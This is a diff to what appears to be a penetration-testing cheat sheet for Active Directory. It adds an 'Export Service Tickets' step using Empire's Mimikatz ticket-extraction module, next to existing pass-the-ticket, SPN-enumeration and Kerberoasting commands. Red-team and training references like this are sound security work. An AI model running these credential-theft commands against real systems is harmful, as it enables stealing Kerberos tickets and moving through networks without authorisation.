@@ -22,6 +22,10 @@ kerberos::ptt PENTESTLAB.kirbi
 ```
 usemodule situational_awareness/network/get_spn
 ```
+**Export Service Tickets**
+```
+usemodule credentials/mimikatz/extract_tickets
+```
 **Kerberoast**
 ```
 usemodule credentials/invoke_kerberoast
